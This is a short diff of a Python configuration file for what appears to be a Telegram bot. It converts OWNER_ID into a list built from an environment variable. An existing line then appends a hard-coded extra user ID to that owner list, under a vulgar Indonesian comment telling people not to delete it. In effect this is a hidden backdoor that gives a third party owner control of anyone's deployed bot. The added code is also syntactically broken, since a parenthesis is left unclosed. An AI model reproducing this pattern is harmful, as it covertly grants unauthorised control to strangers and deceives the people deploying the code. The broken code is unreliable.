@@ -24,8 +24,9 @@ LOGGER_ID = int(getenv("LOGGER_ID", None))
 # MUST JOIN
 MUST_JOIN = getenv("MUST_JOIN", "")
 
-# Get this value from @FallenxBot on Telegram by /id
-OWNER_ID = int(getenv("OWNER_ID", 1441342342))
+# Your User ID.
+OWNER_ID = list(
+    map(int, getenv("OWNER_ID", "1441342342").split())
 
 # JANGAN HAPUS YA KONTOL
 OWNER_ID.append(5089916692)
